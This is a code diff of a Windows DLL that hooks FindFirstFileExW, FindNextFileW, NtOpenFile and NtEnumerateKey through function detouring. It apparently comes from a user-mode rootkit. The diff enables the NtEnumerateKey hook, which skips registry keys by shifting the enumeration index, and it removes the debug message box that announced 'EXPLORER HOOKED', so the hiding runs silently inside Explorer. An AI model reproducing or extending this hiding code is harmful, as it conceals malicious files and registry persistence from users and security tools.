@@ -199,7 +199,6 @@ NTSTATUS WINAPI NewNtOpenFile(
     return 0;//status; // STATUS_NO_SUCH_FILE
 }
 
-/*
 NTSTATUS NTAPI NewNtEnumerateKey(
     HANDLE					KeyHandle,
     ULONG					Index,
@@ -263,7 +262,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
         }
     }
     return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
-}*/
+}
 
 	BOOL APIENTRY DllMain(HMODULE hModule,
 		DWORD  ul_reason_for_call,
@@ -287,8 +286,8 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 			oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
 			hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
 
-			//oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
-			//hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
+			oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
+			hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
 
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -301,7 +300,6 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 	HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
 	{
 		HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
-		MessageBox(0, "EXPLORER HOOKED", "HookTest", MB_OK | MB_ICONERROR);
 		if (ret)
 		{
 			WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;
